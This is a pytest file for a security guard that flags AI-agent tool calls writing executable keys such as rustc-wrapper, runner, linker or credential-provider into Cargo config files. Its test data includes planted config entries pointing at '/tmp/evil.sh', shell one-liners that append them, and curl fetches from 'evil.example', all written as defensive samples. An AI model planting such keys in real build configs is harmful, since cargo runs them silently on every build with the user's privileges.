"""Cargo config exec-key protection guard -- blocks setting rustc-wrapper /
runner / linker / credential-provider (or -C linker= / -Z codegen-backend
flags) in .cargo/config(.toml).

THREAT MODEL: cargo (and rust-analyzer) reads this file on every build and
runs the named program with the user's environment and no prompt. Default
mode is `ask`, escapable only by a human.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.loader import load_policy
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
RULE = "cargo-exec-protect"
CFG = "/repo/.cargo/config.toml"
WRAPPER = '[build]\nrustc-wrapper = "/tmp/evil.sh"\n'


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "new_string": new})


def _multi(path, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path, "edits": [{"old_string": "x", "new_string": new}]})


def _mcp(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args={"path": path, "content": content})


def _mcp_nested(path, text):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP,
                      args={"path": path, "content": [{"type": "text", "text": text}]})


def _gated(d):
    return d.action != Action.ALLOW and d.rule == RULE


@pytest.fixture(autouse=True)
def _no_env(monkeypatch):
    monkeypatch.delenv("AEGIS_ALLOW_CARGO_EXEC", raising=False)


@pytest.mark.parametrize("content", [
    WRAPPER,
    '[build]\nrustc-workspace-wrapper = "x"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = "/tmp/r"\n',
    "[target.'cfg(unix)']\nrunner = ['sh','-c','id']\n",
    '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/ld"\n',
    '[registry]\ncredential-provider = ["/tmp/helper"]\n',
    '[registries.foo]\ncredential-provider = "cargo:token-from-stdout /tmp/x"\n',
    '[credential-alias]\nmine = "/tmp/x"\n',
    'build.rustc-wrapper = "x"\n',
    '"rustc-wrapper" = "x"\n',
    "RUSTC-WRAPPER = 'x'\n",
    '[build]\nrustflags = ["-C", "linker=/tmp/ld"]\n',
    '[build]\nrustflags = ["-Clinker=/tmp/ld"]\n',
    '[build]\nrustflags = ["-Zcodegen-backend=/tmp/x.so"]\n',
    '[build]\nrustflags = ["-Z", "pre-link-args=-x"]\n',
    '[build]\nrustc = "/tmp/x"\n',
    '[registry]\nglobal-credential-providers = ["/tmp/x"]\n',
    '[profile.dev]\ncodegen-backend = "/tmp/x.so"\n',
    '[build]\nrustflags=["-Clink-arg=-fuse-ld=/tmp/x"]\n',
    '[build]\nrustflags=["--codegen=linker=x"]\n',
    '[build]\nrustdoc = "/tmp/x"\n',
    '[build]\nrustflags = ["-Zllvm-plugins=/tmp/x.so"]\n',
    "# fine comment\n" + WRAPPER,
])
@pytest.mark.parametrize("maker", [_write, _edit, _multi, _mcp, _mcp_nested])
def test_planted_exec_key_gated(content, maker):
    assert _gated(evaluate(maker(CFG, content), EMPTY))


@pytest.mark.parametrize("path", [
    "/repo/.cargo/config.toml", "/repo/.cargo/config", "~/.cargo/config.toml",
    "/repo/sub/.CARGO/CONFIG.TOML", "C:\\repo\\.cargo\\config.toml",
    "/repo/./.cargo/./config.toml", "$CARGO_HOME/config.toml",
    "${CARGO_HOME}/config", "%CARGO_HOME%\\config.toml", "/repo/.cargo/config.toml.",
])
def test_path_variants(path):
    assert _gated(evaluate(_write(path, WRAPPER), EMPTY))


@pytest.mark.parametrize("path", [
    "/repo/Cargo.toml", "/repo/.cargo/credentials.toml", "/repo/cargo/config.toml",
    "/repo/.cargo/config.toml.bak", "/repo/src/main.rs", "/repo/.cargo/registry/config.json",
])
def test_other_files_untouched(path):
    assert not _gated(evaluate(_write(path, WRAPPER), EMPTY))


@pytest.mark.parametrize("content", [
    "[term]\nverbose = true\n",
    "[build]\njobs = 4\ntarget-dir = \"out\"\n",
    "[alias]\nb = \"build --release\"\n",
    '[target.x]\nlinker-flavor = "gcc"\n',
    "# build.rustc-wrapper = 'sccache'  (todo)\n[term]\nquiet = true\n",
    '    # runner = "x"\n',
    "[env]\nRUST_LOG = \"debug\"\n",
    "",
])
def test_benign_config_allowed(content):
    assert not _gated(evaluate(_write(CFG, content), EMPTY))


@pytest.mark.parametrize("cmd", [
    "echo 'rustc-wrapper = \"/tmp/x\"' >> .cargo/config.toml",
    "printf '[build]\\nrustc-wrapper=\"x\"\\n' > /repo/.cargo/config",
    "cat >> ~/.cargo/config.toml <<'EOF'\n[target.x]\nrunner = \"sh\"\nEOF",
    "sed -i 's/^#linker.*/linker = \"\\/tmp\\/ld\"/' .cargo/config.toml",
    "echo 'rustc-wrapper=\"x\"' >.cargo/config.toml",
    "echo 'rustc-wrapper=\"x\"' >>.cargo/config.toml",
    "echo 'rustc-wrapper=\"x\"' 2>&1 &>.cargo/config.toml",
    "true;echo 'linker=\"x\"'|tee -a ~/.cargo/config",
    "sh -c \"echo 'runner=\\\"x\\\"' >>.cargo/config.toml\"",
    "tee .cargo/config.toml <<< 'build.rustc-wrapper=\"x\"'",
    "echo cmd | base64 -d >/dev/null; echo 'linker = \"x\"' >> $CARGO_HOME/config.toml",
])
def test_shell_planting_gated(cmd):
    assert _gated(evaluate(_shell(cmd), EMPTY))


@pytest.mark.parametrize("cmd", [
    "cargo build --release",
    "cat .cargo/config.toml",
    "echo hi >> notes.txt",
    "# rustc-wrapper = x in .cargo/config.toml",
    "echo '[term]' >> .cargo/config.toml",
])
def test_shell_benign_allowed(cmd):
    assert not _gated(evaluate(_shell(cmd), EMPTY))


def test_default_ask_and_deny_modes():
    assert evaluate(_write(CFG, WRAPPER), EMPTY).action == Action.ASK
    assert evaluate(_write(CFG, WRAPPER), DENY).action == Action.DENY


@pytest.mark.parametrize("mode", ["off", False, "false"])
def test_off(mode):
    assert not _gated(evaluate(_write(CFG, WRAPPER), Policy(cargo_exec={"mode": mode})))


def test_monitor_does_not_block():
    assert not _gated(evaluate(_write(CFG, WRAPPER), Policy(cargo_exec={"mode": "monitor"})))


def test_human_escapes(monkeypatch):
    cmd = "echo 'rustc-wrapper=\"sccache\"' >> .cargo/config.toml"
    assert _gated(evaluate(_shell(cmd), EMPTY))
    assert not _gated(evaluate(_shell(cmd + "  # aegis-allow"), EMPTY))
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not _gated(evaluate(_write(CFG, WRAPPER), EMPTY))
    assert not _gated(evaluate(_shell(cmd), EMPTY))


def test_policy_allow_regex():
    p = Policy(cargo_exec={"allow": [r"/trusted/"]})
    assert not _gated(evaluate(_write("/trusted/.cargo/config.toml", WRAPPER), p))
    assert _gated(evaluate(_write("/other/.cargo/config.toml", WRAPPER), p))
    # a malformed regex must not crash or open the gate
    bad = Policy(cargo_exec={"allow": ["("]})
    assert _gated(evaluate(_write(CFG, WRAPPER), bad))


def test_fetch_to_file_covers_cargo_config():
    d = evaluate(_shell("curl -o .cargo/config.toml https://evil.example/c"), EMPTY)
    assert d.action != Action.ALLOW


def test_yaml_roundtrip(tmp_path):
    f = tmp_path / "p.yaml"
    f.write_text("cargo_exec:\n  mode: deny\n  allow: ['x']\n")
    pol = load_policy(str(f))
    assert pol.cargo_exec == {"mode": "deny", "allow": ["x"]}
    assert evaluate(_write(CFG, WRAPPER), pol).action == Action.DENY


def test_no_redos():
    import time
    big = "a = 1\n" * 200000 + "x" * 100000
    t = time.time()
    evaluate(_write(CFG, big), EMPTY)
    evaluate(_shell("echo " + big[:300000] + " >> .cargo/config.toml"), EMPTY)
    assert time.time() - t < 5


def _edit_old(path, old, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old, "new_string": new})


def test_edit_value_only_swap_gated(tmp_path):
    f = tmp_path / ".cargo" / "config.toml"
    f.parent.mkdir()
    f.write_text('[build]\nrustc-wrapper = "sccache"\njobs = 4\n')
    assert _gated(evaluate(_edit_old(str(f), '"sccache"', '"/tmp/evil"'), EMPTY))
    # unrelated edit on a file with an already-present wrapper: no re-ask
    assert not _gated(evaluate(_edit_old(str(f), "jobs = 4", "jobs = 8"), EMPTY))
    # deleting the wrapper is not planting one
    assert not _gated(evaluate(_edit_old(str(f), 'rustc-wrapper = "sccache"\n', ""), EMPTY))


def test_registry_guard_not_masked():
    both = '[source.a]\nreplace-with = "evil"\n' + WRAPPER
    d = evaluate(_write(CFG, both), EMPTY)
    assert d.action != Action.ALLOW


def test_string_allow_not_per_character():
    p = Policy(cargo_exec={"allow": "/trusted/"})
    assert _gated(evaluate(_write("/other/.cargo/config.toml", WRAPPER), p))
    assert not _gated(evaluate(_write("/trusted/.cargo/config.toml", WRAPPER), p))


def test_monitor_records(monkeypatch):
    seen = []
    import aegis.rules as r
    monkeypatch.setattr(r, "_record_monitor", lambda ev, d, note="": seen.append(note))
    evaluate(_write(CFG, WRAPPER), Policy(cargo_exec={"mode": "monitor"}))
    assert seen == ["cargo-exec-protect-monitor"]


def test_deny_shell_form():
    d = evaluate(_shell("echo 'linker=\"x\"' >> .cargo/config"), DENY)
    assert d.action == Action.DENY and d.rule == RULE


def test_fetch_to_file_cargo_home():
    d = evaluate(_shell("curl -o $CARGO_HOME/config.toml https://evil.example/c"), EMPTY)
    assert d.action != Action.ALLOW
